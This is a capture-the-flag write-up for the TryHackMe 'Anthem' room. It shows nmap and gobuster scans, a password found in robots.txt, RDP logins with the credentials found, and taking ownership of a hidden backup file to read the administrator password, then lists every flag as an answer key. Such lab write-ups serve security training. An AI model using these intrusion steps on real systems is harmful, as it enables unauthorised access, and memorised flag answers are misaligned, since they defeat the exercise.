# Task 1 Website Analysis
----

>>This task involves you, paying attention to details and finding the 'keys to the castle'.

>>This room is designed for beginners, however, everyone is welcomed to try it out!

>>Enjoy the Anthem.

>>In this room, you don't need to brute force any login page. Just your preferred browser and Remote Desktop.

>>Please give the box up to 5 minutes to boot and configure.

----

# Task 2 Spot the flags
----

>>Our beloved admin left some flags behind that we require to gather before we proceed to the next task..

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.48.36   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-04 08:34 EST
Nmap scan report for 10.10.48.36
Host is up (0.25s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Anthem.com - Welcome to our blog
| http-robots.txt: 4 disallowed entries 
|_/bin/ /config/ /umbraco/ /umbraco_client/
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-LU09299160F
| Not valid before: 2022-02-03T13:25:00
|_Not valid after:  2022-08-05T13:25:00
|_ssl-date: 2022-02-04T13:32:40+00:00; -2m33s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-LU09299160F
|   NetBIOS_Domain_Name: WIN-LU09299160F
|   NetBIOS_Computer_Name: WIN-LU09299160F
|   DNS_Domain_Name: WIN-LU09299160F
|   DNS_Computer_Name: WIN-LU09299160F
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-04T13:32:35+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2m32s, deviation: 0s, median: -2m33s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.85 seconds

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ gobuster dir -u http://10.10.48.36/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.48.36/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/04 08:35:48 Starting gobuster in directory enumeration mode
===============================================================

/Archive              (Status: 301) [Size: 118] [--> /]
/Blog                 (Status: 200) [Size: 5389]       
/RSS                  (Status: 200) [Size: 1869]       
/Search               (Status: 200) [Size: 3464]       
/SiteMap              (Status: 200) [Size: 1035]       
/archive              (Status: 301) [Size: 123] [--> /blog/]
/authors              (Status: 200) [Size: 4110]  
/robots.txt           (Status: 200) [Size: 192]                
/rss                  (Status: 200) [Size: 1859]               
/search               (Status: 200) [Size: 3414]               
/sitemap              (Status: 200) [Size: 1030]               
/tags                 (Status: 200) [Size: 3539]               
/umbraco              (Status: 200) [Size: 4078]   
```

```
# robots.txt

UmbracoIsTheBest!

# Use for all search robots
User-agent: *

# Define the directories not to crawl
Disallow: /bin/
Disallow: /config/
Disallow: /umbraco/
Disallow: /umbraco_client/
```

```bash
# Found the admin name in the cheers to our IT department there is a poem like sentences if we google it , it says it's solomon grundy.

# Found solomon grundy's email by seeing the email address of author jane-doe. The pattern using just two starting letters of First and Second name which is SG@anthem.com

# Found the first flag in the we are hiring page's source code
THM{L0L_WH0_US3S_M3T4}

# Found the second flag in the Tags page's source code
THM{G!T_G00D}

# Found the third flag in the author page jane-doe 
THM{L0L_WH0_D15}

# Found the fourth flag in the cheer's for our IT department's source code
THM{AN0TH3R_M3TA}

```

----

# Task 3 Final stage
----

>>Let's get into the box using the intel we gathered.

```bash
[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ xfreerdp /u:sg /p:UmbracoIsTheBest! /v:10.10.12.247  
[09:38:18:571] [28988:28989] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[09:38:18:572] [28988:28989] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[09:38:18:573] [28988:28989] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[09:38:18:573] [28988:28989] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[09:38:19:018] [28988:28989] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[09:38:19:060] [28988:28989] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:38:19:061] [28988:28989] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[09:38:20:075] [28988:28989] [INFO][com.freerdp.crypto] - creating directory /home/rawbot/.config/freerdp
[09:38:20:075] [28988:28989] [INFO][com.freerdp.crypto] - creating directory [/home/rawbot/.config/freerdp/certs]
[09:38:20:076] [28988:28989] [INFO][com.freerdp.crypto] - created directory [/home/rawbot/.config/freerdp/server]
[09:38:21:013] [28988:28989] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:38:21:013] [28988:28989] [WARN][com.freerdp.crypto] - CN = WIN-LU09299160F
[09:38:21:015] [28988:28989] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[09:38:21:016] [28988:28989] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[09:38:21:016] [28988:28989] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[09:38:21:016] [28988:28989] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.12.247:3389) 
[09:38:21:016] [28988:28989] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[09:38:21:017] [28988:28989] [ERROR][com.freerdp.crypto] - Common Name (CN):
[09:38:21:017] [28988:28989] [ERROR][com.freerdp.crypto] -      WIN-LU09299160F
[09:38:21:017] [28988:28989] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.12.247:3389 (RDP-Server):
        Common Name: WIN-LU09299160F
        Subject:     CN = WIN-LU09299160F
        Issuer:      CN = WIN-LU09299160F
        Thumbprint:  05:33:a7:2b:17:5b:68:1f:2f:92:2d:9a:d0:fe:0d:c9:24:54:5b:6c:18:b1:5d:cb:8b:a8:f7:f0:78:79:89:bc
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y

# Found the user.txt in the windows machine with user account that we have just rdp into
THM{N00T_NO0T}

# Found the admin password in the c drives backup directory it has a restore file which is hidden and if we open that file it shows not allowed. To change that we need to properties and go to security and there is a add box which says to change permission go over there and it has box type sg and hit check names which sets the name and apply it. Then set permission to full control apply click ok to save it. Then open the file which displays this.  
ChangeMeBaby1MoreTime  

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ xfreerdp /u:administrator /p:ChangeMeBaby1MoreTime /v:10.10.12.247 
[10:00:04:156] [35361:35386] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[10:00:04:164] [35361:35386] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[10:00:04:164] [35361:35386] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[10:00:04:165] [35361:35386] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[10:00:04:653] [35361:35386] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[10:00:04:702] [35361:35386] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[10:00:04:702] [35361:35386] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[10:00:06:218] [35361:35386] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0

# Found the root.txt in the windows machine with administrator account 
THM{Y0U_4R3_1337}
```

----

# ANSWER THE QUESTIONS 
----

1.Let's run nmap and check what ports are open.
>>No answer needed

2.What port is for the web server?
>>80

3.What port is for remote desktop service?
>>3389

4.What is a possible password in one of the pages web crawlers check for?
>>UmbracoIsTheBest!

5.What CMS is the website using?
>>Umbraco

6.What is the domain of the website?
>>anthem.com

7.What's the name of the Administrator
>>Solomon Grundy

8.Can we find find the email address of the administrator?
>>sg@anthem.com

9.What is flag 1?
>>THM{L0L_WH0_US3S_M3T4}

11.What is flag 2?
>>THM{G!T_G00D}

12.What is flag 3?
>>THM{L0L_WH0_D15}

13.What is flag 4?
>>THM{AN0TH3R_M3TA}

14.Let's figure out the username and password to log in to the box.(The box is not on a domain)
>>No answer needed

15.Gain initial access to the machine, what is the contents of user.txt?
>>THM{N00T_NO0T}

16.Can we spot the admin password?
>>ChangeMeBaby1MoreTime

17.Escalate your privileges to root, what is the contents of root.txt?
>>THM{Y0U_4R3_1337}

----